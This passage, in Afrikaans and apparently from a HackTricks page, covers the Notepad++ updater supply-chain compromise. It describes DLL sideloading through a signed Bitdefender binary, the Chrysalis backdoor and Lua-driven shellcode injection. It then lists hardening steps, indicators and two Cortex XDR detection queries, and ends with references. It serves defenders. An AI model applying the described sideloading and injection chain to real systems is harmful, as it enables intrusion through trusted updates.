   - **Bring-your-own signed binary + sideload**: bondel die ondertekende Bitdefender-`BluetoothService.exe` en plaas ’n kwaadwillige `log.dll` in sy soekpad. Wanneer die ondertekende binêre lêer loop, laai Windows `log.dll` via sideload; dié lêer dekripteer en laai die Chrysalis-backdoor reflektief (beskerm deur Warbird + API-hashing om statiese opsporing te bemoeilik).
   - **Geskrewe shellcode-inspuiting**: NSIS voer ’n saamgestelde Lua-skrip uit wat Win32-API’s (bv. `EnumWindowStationsW`) gebruik om shellcode in te spuit en Cobalt Strike Beacon te plaas.<sup>[[12]](#references)</sup>

Verhardings-/opsporingslesse vir enige updater:
- Dwing **sertifikaat- en handtekeningverifikasie** van die afgelaaide installeerder af (pen die verskaffer se ondertekenaar vas, verwerp ’n CN/ketting wat nie ooreenstem nie) en onderteken die opdateringsmanifest self (bv. XMLDSig). Blokkeer manifest-beheerde herleidings tensy dit gevalideer is.
- Behandel **BYO signed binary-sideloading** as ’n opsporingsaanknopingspunt ná aflaai: waarsku wanneer ’n ondertekende verskaffer-EXE ’n DLL met ’n naam van buite sy kanonieke installasiepad laai (bv. Bitdefender wat `log.dll` vanaf Temp/Downloads laai), en wanneer ’n updater installeerders met nie-verskaffer-handtekeninge vanaf temp plaas/uitvoer.
- Monitor **wanware-spesifieke artefakte** wat in hierdie ketting waargeneem is (nuttig as algemene aanknopingspunte): mutex `Global\Jdhfv_1.0.1`, abnormale `gup.exe`-skrywes na `%TEMP%` en Lua-gedrewe shellcode-inspuitingsfases.
- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die teruggestuurde XML word nou onderteken (XMLDSig), en nuwer weergawes dwing sertifikaat- en handtekeningverifikasie van die afgelaaide installeerder af, eerder as om net op die vervoermiddel te vertrou.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-ondertekende EXE-sideloading van <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat ’n installeerder anders as Notepad++ begin</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Hierdie patrone geld vir enige updater wat ongeondertekende manifests aanvaar of versuim om installeerder-ondertekenaars vas te pen—netwerkkaping + kwaadwillige installeerder + BYO-signed sideloading lei tot remote code execution onder die dekmantel van “trusted” updates.

---
## References
- [1] [Kennisgewing – Netskope Client for Windows – Plaaslike voorregte-eskalering via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-sekuriteitskennisgewing NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-inprop](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC-kliënt/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre en Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Plaaslike voorregte-eskalering via skryfbare lêers in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Voorregte-eskalering in Windows-agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nasiestaat-akteurs buit Notepad++-voorsieningsketting uit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – opdatering oor die voorval met gekaapte infrastruktuur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Om die oplossing vir CVE-2025-0309 in Netskope Client for Windows te omseil](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Ontdekking van voorregte-eskaleringsfoute in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Van gRPC na SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
